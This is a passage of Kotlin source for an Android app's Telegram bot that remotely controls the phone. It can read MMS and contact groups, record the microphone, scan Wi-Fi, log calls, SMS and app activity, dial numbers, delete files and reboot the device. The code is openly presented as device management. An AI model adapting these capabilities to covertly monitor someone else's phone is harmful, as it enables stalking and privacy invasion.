        if (fences.isEmpty()) {
            sb.append("<i>No geofences defined yet.</i>\n\nTap ➕ Add to create one.")
        } else {
            fences.take(20).forEachIndexed { i, f ->
                val onOff = if (f.enabled) "🟢" else "⚪"
                sb.append("${i + 1}. $onOff <b>${htmlEsc(f.name)}</b>\n")
                sb.append("   📍 ${String.format("%.4f", f.lat)}, ${String.format("%.4f", f.lng)} · r=${f.radius.toInt()}m\n")
                val actions = mutableListOf<String>()
                if (f.triggerEnter) actions.add("enter")
                if (f.triggerExit) actions.add("exit")
                if (actions.isNotEmpty()) sb.append("   Trigger: ${actions.joinToString(", ")}\n")
                sb.append("\n")
                rows.add(listOf(
                    "${if (f.enabled) "⚪ Disable" else "🟢 Enable"} ${f.name.take(14)}" to "gf_tog:${f.id}",
                    "🗑 Delete" to "gf_del:${f.id}",
                ))
            }
            if (fences.size > 20) sb.append("<i>… and ${fences.size - 20} more</i>\n")
        }
        rows.add(listOf("➕ Add geofence" to "gf_add", "📋 Events" to "gf_events"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun renderGeofenceEvents(editMessageId: Long?) {
        val events = GeofencingHelper.listEvents(limit = 20)
        val sb = StringBuilder("🗺 <b>Geofence Events</b> (recent ${events.size})\n━━━━━━━━━━━━━━━━━━━━\n")
        if (events.isEmpty()) {
            sb.append("<i>No geofence events recorded yet.</i>")
        } else {
            events.forEach { e ->
                val icon = if (e.type == "enter") "➡️" else "⬅️"
                sb.append("$icon <b>${htmlEsc(e.geofenceName)}</b> · ${e.type.uppercase()}\n")
                sb.append("   🕐 ${fmtTime(e.ts)} · 🔋 ${e.batteryLevel}%\n")
                sb.append("   📍 ${String.format("%.4f", e.lat)}, ${String.format("%.4f", e.lng)}\n\n")
            }
        }
        val rows = listOf(listOf("📋 View fences" to "gf_list", "➕ Add geofence" to "gf_add"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ==================== /addcontact ====================

    private suspend fun cmdAddContact() {
        sendTyping()
        pendingInput = "addcontact_name"
        sendMessage("➕ <b>Add Contact</b>\n\nStep 1 of 2: Send the contact's <b>full name</b>.\n\nSend any /command to cancel.")
    }

    // ==================== /deletecontact ====================

    private suspend fun cmdDeleteContact(args: List<String>) {
        sendTyping()
        if (args.isEmpty()) {
            pendingInput = "deletecontact_search"
            sendMessage("🗑 <b>Delete Contact</b>\n\nSend a name or number to search for the contact to delete.\nSend any /command to cancel.")
            return
        }
        renderDeleteContactSearch(args.joinToString(" "))
    }

    private suspend fun renderDeleteContactSearch(query: String) {
        try {
            val results = ContactMediaStoreHelper.searchAsync(MainApp.instance, "text:$query", 10, 0)
            if (results.isEmpty()) {
                sendMessage("🔍 No contacts found for <i>${htmlEsc(query)}</i>.")
                return
            }
            val sb = StringBuilder("🗑 <b>Delete Contact</b> — found ${results.size} match${if (results.size == 1) "" else "es"}\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            results.take(10).forEach { c ->
                val display = contactDisplayName(c)
                val phones = c.phoneNumbers.joinToString(", ") { it.value }
                sb.append("• <b>${htmlEsc(display)}</b>${if (phones.isNotBlank()) "  <code>${htmlEsc(phones.take(30))}</code>" else ""}\n")
                rows.add(listOf("🗑 Delete ${display.take(22)}" to "con_del_ok:${c.id}"))
            }
            sb.append("\n<i>⚠️ Deletion is immediate and cannot be undone.</i>")
            val markup = TelegramApiClient.inlineKeyboard(rows)
            sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not search contacts: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /editnote ====================

    private suspend fun cmdEditNote(args: List<String>) {
        sendTyping()
        if (args.isEmpty()) {
            sendMessage("✏️ <b>Edit Note</b>\n\nUsage: <code>/editnote &lt;keyword&gt;</code>\n\nThis searches your notes and lets you pick one to edit.\n\nOr open any note with /notes and tap the ✏️ Edit button.")
            return
        }
        val q = args.joinToString(" ")
        try {
            val results = NoteHelper.search(q, 10, 0)
            if (results.isEmpty()) {
                sendMessage("🔍 No notes found for <i>${htmlEsc(q)}</i>.")
                return
            }
            val sb = StringBuilder("✏️ <b>Edit Note</b> — ${results.size} match${if (results.size == 1) "" else "es"}\n\n<i>Tap to edit:</i>\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            results.take(10).forEach { n ->
                val title = n.title.ifBlank { "(untitled)" }
                sb.append("• <b>${htmlEsc(title.take(50))}</b>\n")
                rows.add(listOf("✏️ Edit: ${title.take(25)}" to "note_edit:${n.id}"))
            }
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } catch (e: Exception) {
            sendMessage("❌ Could not search notes: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== airplane/mobiledata callback helpers ====================

    // These are handled in the callback block via commands; forwarded here via inline buttons:
    // air_on / air_off -> cmdAirplane(listOf("on"/"off"))
    // mdata_on / mdata_off -> cmdMobileData(listOf("on"/"off"))
    // photofwd_on / photofwd_off -> cmdForwardPhotos(listOf("on"/"off"))
    // clipfwd_on / clipfwd_off -> cmdForwardClipboard(listOf("on"/"off"))
    // smsfwd_on / smsfwd_off -> forwardSmsEnabled = true/false (already handled above)

    // ==================== /soundmeter ====================

    @SuppressLint("MissingPermission")
    private suspend fun cmdSoundMeter(args: List<String>) {
        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 10) ?: 3
        sendMessage("🎙 Measuring ambient sound for <b>${seconds}s</b>…")
        sendTyping()
        withContext(Dispatchers.IO) {
            try {
                val sampleRate = 44100
                val bufSize = AudioRecord.getMinBufferSize(
                    sampleRate,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT
                ).let { if (it <= 0) 4096 else it }
                val recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    bufSize * 4
                )
                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    sendMessage("❌ Could not initialize AudioRecord. Ensure Microphone permission is granted.")
                    return@withContext
                }
                recorder.startRecording()
                val buffer = ShortArray(bufSize)
                val readings = mutableListOf<Float>()
                val endTime = System.currentTimeMillis() + seconds * 1000L
                while (System.currentTimeMillis() < endTime) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val amp = SoundMeterHelper.getMaxAmplitude(buffer, read)
                        if (amp > 1.0) {
                            val db = SoundMeterHelper.amplitudeToDecibel(amp)
                            if (db > 0f && db < 200f) readings.add(db)
                        }
                    }
                }
                recorder.stop()
                recorder.release()
                if (readings.isEmpty()) {
                    sendMessage("🎙 <b>Sound Level</b>\n\n⚠️ No audio captured. Check Microphone permission and ensure sound is present.")
                    return@withContext
                }
                val avg = readings.average().toFloat()
                val max = readings.max()
                val min = readings.min()
                val filled = ((avg / 10).toInt()).coerceIn(0, 10)
                val bar = "█".repeat(filled) + "░".repeat(10 - filled)
                val level = when {
                    avg < 30 -> "🤫 Very quiet (library)"
                    avg < 50 -> "🗣 Moderate (conversation)"
                    avg < 70 -> "📢 Loud (busy street)"
                    avg < 90 -> "🔊 Very loud (concert)"
                    else -> "🚨 Extremely loud!"
                }
                sendMessage(
                    "🎙 <b>Ambient Sound Level</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
                    "Duration: ${seconds}s · ${readings.size} samples\n\n" +
                    "[$bar] <b>${String.format("%.1f", avg)} dB</b>\n" +
                    "🔺 Peak: <b>${String.format("%.1f", max)} dB</b>\n" +
                    "🔻 Min: <b>${String.format("%.1f", min)} dB</b>\n\n" +
                    level
                )
            } catch (e: Exception) {
                sendMessage("❌ Sound meter error: ${htmlEsc(e.message ?: "")}\n<i>Ensure Microphone permission is granted.</i>")
            }
        }
    }

    // ==================== /qrcode ====================

    private suspend fun cmdQrCode(content: String) {
        if (content.isBlank()) {
            sendMessage("📷 <b>QR Code Generator</b>\n\nUsage: <code>/qrcode &lt;text or URL&gt;</code>\n\nExamples:\n<code>/qrcode https://plainapp.co</code>\n<code>/qrcode Hello World</code>")
            return
        }
        sendTyping()
        try {
            val size = 512
            val bitmap = QrCodeGenerateHelper.generate(content.trim(), size, size)
            val file = File(MainApp.instance.cacheDir, "tg_qr_${System.currentTimeMillis()}.jpg")
            java.io.FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 95, out)
            }
            sendUploadPhoto()
            TelegramApiClient.sendPhoto(token, chatId, file, "📷 QR: ${htmlEsc(content.take(80))}")
            file.delete()
        } catch (e: Exception) {
            sendMessage("❌ QR code error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /docs ====================

    private suspend fun cmdDocs(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderDocsPage(q, 0, editMessageId = null)
    }

    private suspend fun renderDocsPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = DocsHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📄 No documents found${if (query.isNotBlank()) " matching <i>${htmlEsc(query.removePrefix("text:"))}</i>" else ""}." else "📄 No more documents."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📄 <b>Documents</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, doc ->
                val ext = doc.path.substringAfterLast('.').uppercase().take(6)
                sb.append("${offset + i + 1}. 📄 <b>${htmlEsc(doc.name.take(55))}</b>\n")
                sb.append("   [$ext] · ${humanSize(doc.size)} · ${fmtTime((doc.createdAt ?: doc.updatedAt).toEpochMilliseconds())}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${doc.name.take(28)}" to "doc_get:${pathToken(doc.path)}"))
            }
            val qSeg = safeSeg(query.ifBlank { "_" })
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "doc_pg:$qSeg:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "doc_pg:$qSeg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load documents: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /filehash ====================

    private suspend fun cmdFileHash(args: List<String>) {
        if (args.isEmpty()) {
            sendMessage("#️⃣ <b>File Hash</b>\n\nUsage: <code>/filehash &lt;path&gt;</code>\n\nExample:\n<code>/filehash /sdcard/DCIM/photo.jpg</code>")
            return
        }
        val path = args.joinToString(" ").trim()
        sendMessage("⏳ Hashing <code>${htmlEsc(path)}</code>…")
        withContext(Dispatchers.IO) {
            val f = File(path)
            if (!f.exists() || !f.isFile) {
                sendMessage("❌ File not found: <code>${htmlEsc(path)}</code>"); return@withContext
            }
            if (f.length() > 500 * 1024 * 1024L) {
                sendMessage("❌ File too large (>500 MB) — hashing skipped."); return@withContext
            }
            try {
                val sha256 = FileHashHelper.strongHash(f)
                val md5Weak = FileHashHelper.weakHash(f)
                sendMessage(
                    "#️⃣ <b>File Hash</b>\n" +
                    "📄 <code>${htmlEsc(f.name)}</code>\n" +
                    "📦 Size: ${humanSize(f.length())}\n" +
                    "📂 Path: <code>${htmlEsc(path)}</code>\n\n" +
                    "🔐 <b>SHA-256:</b>\n<code>$sha256</code>\n\n" +
                    "🔑 <b>MD5/Weak:</b>\n<code>$md5Weak</code>"
                )
            } catch (e: Exception) {
                sendMessage("❌ Hashing failed: ${htmlEsc(e.message ?: "")}")
            }
        }
    }

    // ==================== /wifiscan ====================

    @SuppressLint("MissingPermission")
    private suspend fun cmdWifiScan() {
        sendTyping()
        val ctx = MainApp.instance
        @Suppress("DEPRECATION")
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
        if (wm == null) { sendMessage("❌ Wi-Fi service unavailable."); return }
        sendMessage("📡 Scanning for Wi-Fi networks…")
        withContext(Dispatchers.IO) {
            try {
                @Suppress("DEPRECATION")
                wm.startScan()
                delay(2800L)
                @Suppress("DEPRECATION")
                val results = wm.scanResults
                if (results.isNullOrEmpty()) {
                    sendMessage("📡 No networks found.\n<i>Ensure Wi-Fi is enabled and Location permission is granted.</i>")
                    return@withContext
                }
                val sorted = results.sortedByDescending { it.level }
                val sb = StringBuilder("📡 <b>Nearby Wi-Fi Networks</b> (${sorted.size})\n━━━━━━━━━━━━━━━━━━━━\n\n")
                sorted.take(20).forEachIndexed { i, r ->
                    @Suppress("DEPRECATION")
                    val ssid = if (r.SSID.isNullOrBlank()) "(hidden)" else r.SSID
                    val bars = when {
                        r.level >= -55 -> "▂▄▆█"
                        r.level >= -70 -> "▂▄▆░"
                        r.level >= -80 -> "▂▄░░"
                        else -> "▂░░░"
                    }
                    val freq = if (r.frequency > 4000) "5GHz" else "2.4GHz"
                    val lock = if (r.capabilities.contains("WPA") || r.capabilities.contains("WEP")) "🔒" else "🔓"
                    sb.append("${i + 1}. $lock $bars <b>${htmlEsc(ssid)}</b>  ${r.level} dBm\n")
                    sb.append("   $freq · <code>${r.BSSID ?: ""}</code>\n\n")
                    if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
                }
                sendMessage(sb.toString())
            } catch (e: Exception) {
                sendMessage("❌ Wi-Fi scan error: ${htmlEsc(e.message ?: "")}")
            }
        }
    }

    // ==================== /timeline ====================

    private fun cmdTimeline(args: List<String>) {
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 200) ?: 50
        val all = TimelineHelper.all(n)
        val entries = all.takeLast(n).reversed()
        if (entries.isEmpty()) {
            sendMessage("📋 <b>Device Timeline</b>\n\n<i>No activity recorded yet. Events are captured by PlainApp's background service.</i>")
            return
        }
        val sb = StringBuilder("📋 <b>Device Timeline</b> (last ${entries.size})\n━━━━━━━━━━━━━━━━━━━━\n\n")
        entries.forEach { e ->
            val icon = when (e.type) {
                "app_launch" -> "🚀"
                "call" -> "📞"
                "sms" -> "💬"
                "notif" -> "🔔"
                "screenshot" -> "📸"
                "location" -> "📍"
                "music" -> "🎵"
                else -> "•"
            }
            sb.append("$icon <b>${htmlEsc(e.title.take(60))}</b>\n")
            if (e.subtitle.isNotBlank()) sb.append("   <i>${htmlEsc(e.subtitle.take(80))}</i>\n")
            if (e.appName.isNotBlank()) sb.append("   📱 ${htmlEsc(e.appName.take(40))}\n")
            sb.append("   🕐 ${fmtTime(e.time)}\n\n")
            if (sb.length > 3800) { sb.append("… (truncated — use /timeline <n> for fewer entries)"); return@forEach }
        }
        sendMessage(sb.toString())
    }

    // ==================== /contactgroups ====================

    private suspend fun cmdContactGroups() {
        sendTyping()
        val groups = try { GroupHelper.getAll() } catch (e: Exception) {
            sendMessage("❌ Could not read contact groups: ${htmlEsc(e.message ?: "")}"); return
        }
        if (groups.isEmpty()) {
            sendMessage("👥 <b>Contact Groups</b>\n\n<i>No contact groups found on this device.</i>")
            return
        }
        val sb = StringBuilder("👥 <b>Contact Groups</b> (${groups.size})\n━━━━━━━━━━━━━━━━━━━━\n<i>Tap a group to view its members.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        groups.take(20).forEachIndexed { i, g ->
            sb.append("${i + 1}. 👥 <b>${htmlEsc(g.name)}</b>  <code>${g.id}</code>\n")
            rows.add(listOf("${i + 1}. ${g.name.take(34)}" to "cg_view:${g.id}"))
        }
        if (groups.size > 20) sb.append("\n<i>… and ${groups.size - 20} more groups (only first 20 shown)</i>")
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private suspend fun renderContactGroupMembers(groupId: String, editMessageId: Long?) {
        try {
            val ctx = MainApp.instance
            val memberContactIds = mutableSetOf<String>()
            val uri = android.provider.ContactsContract.Data.CONTENT_URI
            val projection = arrayOf(android.provider.ContactsContract.CommonDataKinds.GroupMembership.CONTACT_ID)
            val sel = "${android.provider.ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID} = ? AND ${android.provider.ContactsContract.Data.MIMETYPE} = ?"
            val selArgs = arrayOf(groupId, android.provider.ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE)
            ctx.contentResolver.query(uri, projection, sel, selArgs, null)?.use { cur ->
                while (cur.moveToNext()) memberContactIds.add(cur.getString(0))
            }
            val groupName = try { GroupHelper.getAll().firstOrNull { it.id.toString() == groupId }?.name ?: "Group" } catch (_: Throwable) { "Group" }
            if (memberContactIds.isEmpty()) {
                val msg = "👥 <b>${htmlEsc(groupName)}</b>\n\n<i>This group has no members.</i>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("👥 <b>${htmlEsc(groupName)}</b> (${memberContactIds.size} members)\n━━━━━━━━━━━━━━━━━━━━\n\n")
            memberContactIds.take(30).forEach { cid ->
                val contact = try { ContactMediaStoreHelper.getByIdAsync(ctx, cid) } catch (_: Throwable) { null }
                if (contact != null) {
                    val name = contactDisplayName(contact)
                    val phone = contact.phoneNumbers.firstOrNull()?.value ?: ""
                    sb.append("👤 <b>${htmlEsc(name)}</b>${if (phone.isNotBlank()) "  <code>${htmlEsc(phone)}</code>" else ""}\n")
                } else {
                    sb.append("👤 <i>Contact #${cid}</i>\n")
                }
            }
            if (memberContactIds.size > 30) sb.append("\n<i>… and ${memberContactIds.size - 30} more members</i>")
            val rows = listOf(listOf("⬅️ Back to groups" to "cg_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load group members: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ==================== /callnow ====================

    private fun cmdCallNow(args: List<String>) {
        if (args.isEmpty()) {
            sendMessage("📞 <b>Make a Call</b>\n\nUsage: <code>/callnow &lt;number&gt;</code>\n\nExample: <code>/callnow +15551234567</code>\n\n<i>Requires CALL_PHONE permission.</i>")
            return
        }
        val raw = args.joinToString("").trim()
        val number = raw.filter { it.isDigit() || it == '+' || it == '#' || it == '*' }
        if (number.isBlank()) { sendMessage("❌ Invalid number: <code>${htmlEsc(raw)}</code>"); return }
        try {
            val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            MainApp.instance.startActivity(intent)
            sendMessage("📞 Dialing <code>${htmlEsc(number)}</code> on the device…\n\nUse /livecall to manage the call.")
        } catch (e: Exception) {
            sendMessage("❌ Could not initiate call: ${htmlEsc(e.message ?: "")}\n<i>Ensure CALL_PHONE permission is granted and the number is valid.</i>")
        }
    }

    // ==================== /deletefile ====================

    private suspend fun cmdDeleteFile(args: List<String>) {
        if (args.isEmpty()) {
            sendMessage("🗑 <b>Delete File</b>\n\nUsage: <code>/deletefile &lt;path&gt;</code>\n\nExample:\n<code>/deletefile /sdcard/Download/old.apk</code>\n\n⚠️ Deletion is <b>permanent</b> and cannot be undone.")
            return
        }
        val path = args.joinToString(" ").trim()
        val f = File(path)
        if (!f.exists()) { sendMessage("❌ File not found: <code>${htmlEsc(path)}</code>"); return }
        val typeStr = if (f.isDirectory) "📁 Directory" else "📄 File"
        val sizeStr = if (f.isFile) " · ${humanSize(f.length())}" else ""
        val tok = pathToken(path)
        val sb = "$typeStr: <b>${htmlEsc(f.name)}</b>$sizeStr\n<code>${htmlEsc(path)}</code>\n\n⚠️ <b>This cannot be undone.</b> Confirm?"
        val markup = TelegramApiClient.inlineKeyboard(listOf(
            listOf("✅ Yes, delete" to "df_yes:$tok", "❌ Cancel" to "df_no:")
        ))
        sendMessage("🗑 <b>Delete File</b>\n\n$sb", replyMarkup = markup)
    }

    // ==================== /networkinfo ====================

    @SuppressLint("MissingPermission")
    private suspend fun cmdNetworkInfo() {
        sendTyping()
        val ctx = MainApp.instance
        @Suppress("DEPRECATION")
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
        val sb = StringBuilder("🌐 <b>Network Information</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
        try {
            val active = cm?.activeNetwork
            val nc = cm?.getNetworkCapabilities(active)
            val lp = cm?.getLinkProperties(active)
            val netType = when {
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "📶 Wi-Fi"
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "📡 Cellular"
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "🔌 Ethernet"
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true -> "🔐 VPN"
                else -> "❓ None / Unknown"
            }
            sb.append("🔌 <b>Active:</b> $netType\n")
            val ips = lp?.linkAddresses?.joinToString(", ") { "${it.address.hostAddress}/${it.prefixLength}" }
            if (!ips.isNullOrBlank()) sb.append("🌐 <b>IPs:</b> <code>$ips</code>\n")
            val dns = lp?.dnsServers?.joinToString(", ") { it.hostAddress ?: "" }
            if (!dns.isNullOrBlank()) sb.append("🔍 <b>DNS:</b> <code>$dns</code>\n")
            val gateway = lp?.routes?.firstOrNull { it.isDefaultRoute }?.gateway?.hostAddress
            if (!gateway.isNullOrBlank()) sb.append("🚪 <b>Gateway:</b> <code>$gateway</code>\n")
            val iface = lp?.interfaceName
            if (!iface.isNullOrBlank()) sb.append("🔌 <b>Interface:</b> <code>$iface</code>\n")
            val down = nc?.linkDownstreamBandwidthKbps
            val up = nc?.linkUpstreamBandwidthKbps
            if (down != null && up != null) sb.append("⬇️ ${down / 1000} Mbps  ⬆️ ${up / 1000} Mbps\n")
            if (nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true && wm != null) {
                sb.append("\n📶 <b>Wi-Fi Details</b>\n")
                @Suppress("DEPRECATION")
                val info = wm.connectionInfo
                if (info != null) {
                    @Suppress("DEPRECATION")
                    val ssid = info.ssid?.removePrefix("\"")?.removeSuffix("\"") ?: "unknown"
                    sb.append("   SSID: <b>${htmlEsc(ssid)}</b>\n")
                    sb.append("   BSSID: <code>${info.bssid ?: "unknown"}</code>\n")
                    sb.append("   Signal: ${info.rssi} dBm\n")
                    sb.append("   Link speed: <b>${info.linkSpeed} Mbps</b>\n")
                    sb.append("   Frequency: ${info.frequency} MHz (${if (info.frequency > 4000) "5 GHz" else "2.4 GHz"})\n")
                    val ip = android.text.format.Formatter.formatIpAddress(info.ipAddress)
                    sb.append("   IP: <code>$ip</code>\n")
                }
            }
        } catch (e: Exception) {
            sb.append("Error reading network info: ${htmlEsc(e.message ?: "")}\n")
        }
        sb.append("\n🕐 $ts")
        sendMessage(sb.toString())
    }

    // ==================== /reboot ====================

    private suspend fun cmdReboot() {
        sendTyping()
        val isRooted = RootHelper.isRooted()
        val isAdmin = DeviceAdminGuard.isAdminActive(MainApp.instance)
        if (!isRooted && !isAdmin) {
            sendMessage("❌ <b>Reboot not available</b>\n\nReboot requires either:\n• Root access (Magisk / KernelSU / APatch), or\n• Device Admin privilege (Android 7+)\n\nNeither is active on this device.")
            return
        }
        val via = when {
            isRooted -> "root shell"
            else -> "Device Admin (Android 7+)"
        }
        val key = if (isRooted) "reboot_yes" else "reboot_adm"
        sendMessage(
            "🔄 <b>Reboot Device</b>\n\nMethod: <b>$via</b>\n\n⚠️ The device will restart immediately. The bot will reconnect automatically after reboot.",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("✅ Yes, reboot now" to key, "❌ Cancel" to "reboot_no")
            ))
        )
    }

    // ==================== /mms ====================

    private suspend fun cmdMms(args: List<String>) {
        sendTyping()
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 10
        renderMmsPage(offset = 0, editMessageId = null, pageSize = n)
    }

    private suspend fun renderMmsPage(offset: Int, editMessageId: Long?, pageSize: Int = 10) {
        try {
            val ctx = MainApp.instance
            val uri = android.net.Uri.parse("content://mms")
            val projection = arrayOf("_id", "date", "sub", "read", "msg_box")
            val cursor = ctx.contentResolver.query(
                uri, projection, null, null, "date DESC"
            ) ?: run {
                val msg = "❌ Could not access MMS inbox. Check SMS permission."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val total = cursor.count
            if (total == 0) {
                cursor.close()
                val msg = "💬 No MMS messages found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            if (!cursor.move(offset + 1)) {
                cursor.close()
                val msg = "💬 No more MMS messages."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("💬 <b>MMS Messages</b> · ${offset + 1}–${min(offset + pageSize, total)} of $total\n━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            do {
                val id = cursor.getString(cursor.getColumnIndexOrThrow("_id"))
                val dateMs = cursor.getLong(cursor.getColumnIndexOrThrow("date")) * 1000L
                val subject = cursor.getString(cursor.getColumnIndexOrThrow("sub"))?.takeIf { it.isNotBlank() } ?: "(no subject)"
                val read = cursor.getInt(cursor.getColumnIndexOrThrow("read"))
                val box = cursor.getInt(cursor.getColumnIndexOrThrow("msg_box"))
                val dir = if (box == 1) "📥" else "📤"
                val readMark = if (read == 0) " 🔵" else ""
                // Read sender/recipient from mms address table
                var address = "(unknown)"
                try {
                    val addrUri = android.net.Uri.parse("content://mms/$id/addr")
                    ctx.contentResolver.query(addrUri, arrayOf("address", "type"), null, null, null)?.use { ac ->
                        while (ac.moveToNext()) {
                            val addrType = ac.getInt(ac.getColumnIndexOrThrow("type"))
                            val addrVal = ac.getString(ac.getColumnIndexOrThrow("address"))?.trim() ?: continue
                            if (addrVal.isNotBlank() && addrVal != "insert-address-token") {
                                if (box == 1 && addrType == 137) { address = addrVal; break }
                                if (box != 1 && addrType == 151) { address = addrVal; break }
                                address = addrVal
                            }
                        }
                    }
                } catch (_: Throwable) {}
                // Read body text from mms part table
                var body = ""
                try {
                    val partUri = android.net.Uri.parse("content://mms/$id/part")
                    ctx.contentResolver.query(partUri, arrayOf("ct", "text"), null, null, null)?.use { pc ->
                        while (pc.moveToNext()) {
                            val ct = pc.getString(pc.getColumnIndexOrThrow("ct")) ?: ""
                            if (ct == "text/plain") {
                                body = pc.getString(pc.getColumnIndexOrThrow("text"))?.take(200) ?: ""
                                break
                            }
                        }
                    }
                } catch (_: Throwable) {}
                sb.append("${offset + count + 1}. $dir <b>${htmlEsc(address.take(30))}</b>$readMark\n")
                sb.append("   📌 <i>${htmlEsc(subject.take(60))}</i>\n")
                if (body.isNotBlank()) sb.append("   ${htmlEsc(body.take(100))}\n")
                sb.append("   🕐 ${fmtTime(dateMs)}\n\n")
                count++
                if (sb.length > 3500) { sb.append("…"); break }
            } while (cursor.moveToNext() && count < pageSize)
            cursor.close()
            val rows = mutableListOf<List<Pair<String, String>>>()
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "mms_pg:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < total) nav.add("Next ▶️" to "mms_pg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read MMS: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  New Sensor Commands
    // ─────────────────────────────────────────────────────────────────────────

    private fun cmdGyroscope() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_GYROSCOPE)) {
            sendMessage("❌ This device does not have a gyroscope sensor.")
            return
        }
        val d = SensorHelper.latestGyro
        sendMessage(buildString {
            append("🌀 <b>Gyroscope</b>\n\n")
            append("• <b>X</b> (roll):  <code>${d.x}</code> rad/s\n")
            append("• <b>Y</b> (pitch): <code>${d.y}</code> rad/s\n")
            append("• <b>Z</b> (yaw):   <code>${d.z}</code> rad/s\n")
            append("• <b>Magnitude</b>: <code>${d.magnitude}</code> rad/s\n")
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdCompass() {
